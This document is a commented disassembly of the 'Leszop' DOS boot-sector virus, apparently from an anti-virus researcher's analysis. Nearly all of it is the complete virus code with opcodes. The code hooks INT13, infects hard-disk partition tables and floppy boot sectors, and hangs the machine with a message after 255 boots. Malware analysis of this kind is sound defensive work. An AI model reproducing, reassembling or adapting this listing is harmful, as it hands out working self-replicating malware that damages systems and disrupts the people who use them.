;     "Leszop" virus

; This virus infects partition tables of hard drives and boot sectors of
; floppy diskettes. The original partition table will be saved on
; 0.cylinder 0.head 7.sector. The original bot sectors on floppy
; diskettes will be saved on 0.cylinder 1.head 3.sector. The virus works
; like Stoned virus. If the virus infected a partition table of hard
; drive or boot sector of non-write-protect diskette, then after 255.
; boot process the following message will display, and system hang up:
;
;           "leszoptad!"
;
; Discovered and commented by
;                   Ferenc Leitold
;            Hungarian VirusBuster Team
;                        Address: 1399 Budapest
;                                 P.O. BOX 701/349
;                                 HUNGARY


BOOT:0000  EB17           JMP    0019       ; Jump to boot
BOOT:0002  90             NOP
BOOT:0003  50             PUSH   AX
BOOT:0004  43             INC    BX
BOOT:0005  20546F         AND    [SI+6F],DL
BOOT:0008  6F             OUTSW
BOOT:0009  6C             INSB
BOOT:000A  73

BOOT:000B  00         DB     0      ; 0: floppy disk
                        ; 2: hard disk

BOOT:000C  00000000   DW     0,0        ; Pleace of virus at TOP

BOOT:0010  59EC00F0       DW     0EC59,0F000    ; Original INT13 vector

BOOT:0014  007C0000   DW     7C00,0     ; Address of original sector

BOOT:0018  00         DB     0      ; Boot counter

;*********************************************************************
;*                       Main entry point                            *
;*********************************************************************

BOOT:0019  33C0           XOR    AX,AX      : Set DS to 0
BOOT:001B  8ED8           MOV    DS,AX
BOOT:001D  FA             CLI               ; Set SS:SP
BOOT:001E  8ED0           MOV    SS,AX
BOOT:0020  BC007C         MOV    SP,7C00
BOOT:0023  FB             STI

BOOT:0024  E81D00         CALL   0044       ; Change INT13 vector,
                        ; Decrease memory


BOOT:0027  8EC0           MOV    ES,AX      ; Copy virusbody to TOP
BOOT:0029  BE007C         MOV    SI,7C00
BOOT:002C  33FF           XOR    DI,DI
BOOT:002E  B9BE01         MOV    CX,01BE
BOOT:0031  90             NOP
BOOT:0032  F3A4           REP    MOVSB
BOOT:0034  0E             PUSH   CS
BOOT:0035  1F             POP    DS

BOOT:0036  C7060C7C6600   MOV    [7C0C],0066    ; Jump to TOP
BOOT:003C  8C060E7C       MOV    [7C0E],ES
BOOT:0040  FF2E0C7C       JMP    Far [7C0C]

;*********************************************************************
;* SUBRUTINE:       Save INT13 vector & decrease available memory    *
;*********************************************************************

BOOT:0044  A14C00         MOV    AX,[004C]  ; Save INT13 vector
BOOT:0047  A3107C         MOV    [7C10],AX
BOOT:004A  A14E00         MOV    AX,[004E]
BOOT:004D  A3127C         MOV    [7C12],AX
                        ; Set new INT13 vector
BOOT:0050  B82C01         MOV    AX,012C
BOOT:0053  A34C00         MOV    [004C],AX
                        ; Decrease available memory
BOOT:0056  A11304         MOV    AX,[0413]
BOOT:0059  48             DEC    AX         ; 2 KByte
BOOT:005A  48             DEC    AX
BOOT:005B  A31304         MOV    [0413],AX
                        ; Calculate segment
BOOT:005E  B106           MOV    CL,06
BOOT:0060  D3E0           SHL    AX,CL
BOOT:0062  A34E00         MOV    [004E],AX  ; Set new INT13 segment
BOOT:0065  C3             RET

;*********************************************************************
;*                        Entry point on TOP                         *
;*********************************************************************

BOOT:0066  33C0           XOR    AX,AX
BOOT:0068  8EC0           MOV    ES,AX
BOOT:006A  BB007C         MOV    BX,7C00
BOOT:006D  B80102         MOV    AX,0201
BOOT:0070  2E803E0B0000   CMP    CS:[000B],00   ; Floppy or Hard disk
BOOT:0076  743A           JZ     00B2

                        ; On hard disk
BOOT:0078  B90100         MOV    CX,0001        ; Set pleace of MBOOT
BOOT:007B  BA8000         MOV    DX,0080
BOOT:007E  CD13           INT    13

BOOT:0080  FE06187C       INC    B/[7C18]   ; Increment boot counter
BOOT:0084  803E187CFF     CMP    [7C18],FF
BOOT:0089  7217           JC     00A2
                        ; If counter==FF
BOOT:008B  BE2101         MOV    SI,0121    ; Write coded text "leszoptad!"
BOOT:008E  90             NOP
BOOT:008F  0E             PUSH   CS
BOOT:0090  1F             POP    DS
BOOT:0091  AC             LODSB
BOOT:0092  D0E8           SHR    AL,1
BOOT:0094  0AC0           OR     AL,AL
BOOT:0096  7408           JZ     00A0
BOOT:0098  B40E           MOV    AH,0E
BOOT:009A  B700           MOV    BH,00
BOOT:009C  CD10           INT    10
BOOT:009E  EBF1           JMP    0091
BOOT:00A0  EBFE           JMP    00A0       ; Hang up system

BOOT:00A2  B80103         MOV    AX,0301    ; Write incremented MBOOT
BOOT:00A5  CD13           INT    13

BOOT:00A7  B80102         MOV    AX,0201    ; Load original MBOOT
BOOT:00AA  B90700         MOV    CX,0007    ; 0.cyl, 0.hd, 7. sector
BOOT:00AD  CD13           INT    13
BOOT:00AF  EB5E           JMP    010F       ; Jump to MBOOT
BOOT:00B1  90             NOP

                        ; On floppy disk
BOOT:00B2  B90300         MOV    CX,0003    ; 0.cyl, 3.sector
BOOT:00B5  BA0001         MOV    DX,0100    ; 1.hd
BOOT:00B8  CD13           INT    13     ; Load original boot sector
BOOT:00BA  7305           JNC    00C1
BOOT:00BC  B80102         MOV    AX,0201
BOOT:00BF  EBF1           JMP    00B2       ; Try again

BOOT:00C1  B80102         MOV    AX,0201    ; Load MBOOT of 1st hard disk
BOOT:00C4  BB0002         MOV    BX,0200    ;  to CS:200
BOOT:00C7  0E             PUSH   CS
BOOT:00C8  0E             PUSH   CS
BOOT:00C9  07             POP    ES
BOOT:00CA  1F             POP    DS
BOOT:00CB  B101           MOV    CL,01
BOOT:00CD  BA8000         MOV    DX,0080
BOOT:00D0  CD13           INT    13

                        ; Check if MBOOT is infected ?
BOOT:00D2  BF0002         MOV    DI,0200
BOOT:00D5  33F6           XOR    SI,SI
BOOT:00D7  AD             LODSW
BOOT:00D8  3B05           CMP    AX,[DI]
BOOT:00DA  7506           JNZ    00E2
BOOT:00DC  AD             LODSW
BOOT:00DD  3B4502         CMP    AX,[DI+02]
BOOT:00E0  742D           JZ     010F       ; Jump if infected yet

                        ; If not infected !
BOOT:00E2  B80103         MOV    AX,0301    ; Save original MBOOT
BOOT:00E5  B107           MOV    CL,07
BOOT:00E7  BA8000         MOV    DX,0080
BOOT:00EA  CD13           INT    13
BOOT:00EC  2EC6060B0002   MOV    CS:[000B],02   ; Set DiskTypeFlag
BOOT:00F2  BEBE03         MOV    SI,03BE    ; Copy partitions information
BOOT:00F5  B94202         MOV    CX,0242
BOOT:00F8  BFBE01         MOV    DI,01BE
BOOT:00FB  F3A4           REP    MOVSB

BOOT:00FD  2EC606180000   MOV    CS:[0018],00   ; Reset boot counter

BOOT:0103  B80103         MOV    AX,0301    ; Save new MBOOT
BOOT:0106  33DB           XOR    BX,BX
BOOT:0108  B101           MOV    CL,01
BOOT:010A  BA8000         MOV    DX,0080
BOOT:010D  CD13           INT    13

                        ; Jump to original loaded sector
BOOT:010F  2EC7061400007C MOV    CS:[0014],7C00
BOOT:0116  2EC6060B0000   MOV    CS:[000B],00   ; Set DiskTypeFlag to Floppy
BOOT:011C  2EFF2E1400     JMP    Far CS:[0014]

                        ; Coded text
BOOT:0121  D8CA                     ; "leszoptad!"
BOOT:0123  E6F4
BOOT:0125  DEE0
BOOT:0127  E8C2
BOOT:0129  C842
BOOT:012B  00             DB     0

;*********************************************************************
;*                      New INT13 entry point                        *
;*********************************************************************

BOOT:012C  06             PUSH   ES     ; Save registers
BOOT:012D  1E             PUSH   DS
BOOT:012E  50             PUSH   AX
BOOT:012F  53             PUSH   BX
BOOT:0130  51             PUSH   CX
BOOT:0131  52             PUSH   DX
BOOT:0132  56             PUSH   SI
BOOT:0133  57             PUSH   DI
BOOT:0134  9C             PUSHF
BOOT:0135  0E             PUSH   CS
BOOT:0136  07             POP    ES
                        ; If not read or write
BOOT:0137  80FC02         CMP    AH,02      ;  jump to original INT13
BOOT:013A  726D           JC     01A9
BOOT:013C  80FC04         CMP    AH,04
BOOT:013F  7368           JNC    01A9

BOOT:0141  80FA80         CMP    DL,80      ; If HD jump to original INT13
BOOT:0144  7363           JNC    01A9

BOOT:0146  33C0           XOR    AX,AX
BOOT:0148  8ED8           MOV    DS,AX
BOOT:014A  A13F04         MOV    AX,[043F]  ; Test diskette motor
BOOT:014D  A801           TEST   AL,01
BOOT:014F  7558           JNZ    01A9       ; If not run jump to original
                        ;  INT13

BOOT:0151  BE0400         MOV    SI,0004    ; 4 probe
BOOT:0154  33C0           XOR    AX,AX
BOOT:0156  E85E00         CALL   01B7       ; Reset drive
BOOT:0159  BB0002         MOV    BX,0200    ; Load boot sector to CS:200
BOOT:015C  B90100         MOV    CX,0001
BOOT:015F  33D2           XOR    DX,DX
BOOT:0161  B80102         MOV    AX,0201
BOOT:0164  E85000         CALL   01B7
BOOT:0167  7306           JNC    016F
BOOT:0169  4E             DEC    SI
BOOT:016A  75E8           JNZ    0154       ; Next probe
BOOT:016C  EB3B           JMP    01A9       ; Jump to original INT13
BOOT:016E  90             NOP

BOOT:016F  BF0002         MOV    DI,0200    ; Check, if the sector is
BOOT:0172  33F6           XOR    SI,SI      ;  infected
BOOT:0174  0E             PUSH   CS
BOOT:0175  1F             POP    DS
BOOT:0176  AD             LODSW
BOOT:0177  3B05           CMP    AX,[DI]
BOOT:0179  7506           JNZ    0181
BOOT:017B  AD             LODSW
BOOT:017C  3B4502         CMP    AX,[DI+02]
BOOT:017F  7428           JZ     01A9

                        ; If not infected
BOOT:0181  33C0           XOR    AX,AX      ; Reset drive
BOOT:0183  33D2           XOR    DX,DX
BOOT:0185  E82F00         CALL   01B7
                        ; Write original boot sector
BOOT:0188  B80103         MOV    AX,0301    ; 0.cyl, 1.hd, 3.sector
BOOT:018B  BB0002         MOV    BX,0200
BOOT:018E  B103           MOV    CL,03
BOOT:0190  B601           MOV    DH,01
BOOT:0192  E82200         CALL   01B7
BOOT:0195  7212           JC     01A9

BOOT:0197  33C0           XOR    AX,AX      ; Reset drive
BOOT:0199  E81B00         CALL   01B7

BOOT:019C  B80103         MOV    AX,0301    ; Save new boot sector
BOOT:019F  33DB           XOR    BX,BX
BOOT:01A1  B90100         MOV    CX,0001
BOOT:01A4  33D2           XOR    DX,DX
BOOT:01A6  E80E00         CALL   01B7

BOOT:01A9  9D             POPF          ; Restore registers
BOOT:01AA  5F             POP    DI
BOOT:01AB  5E             POP    SI
BOOT:01AC  5A             POP    DX
BOOT:01AD  59             POP    CX
BOOT:01AE  5B             POP    BX
BOOT:01AF  58             POP    AX
BOOT:01B0  1F             POP    DS
BOOT:01B1  07             POP    ES

BOOT:01B2  2EFF2E1000     JMP    Far CS:[0010]  ; Jump to original INT13
BOOT:01B7  9C             PUSHF
BOOT:01B8  2EFF1E1000     CALL   Far CS:[0010]  ; Call original INT13
BOOT:01BD  C3             RET

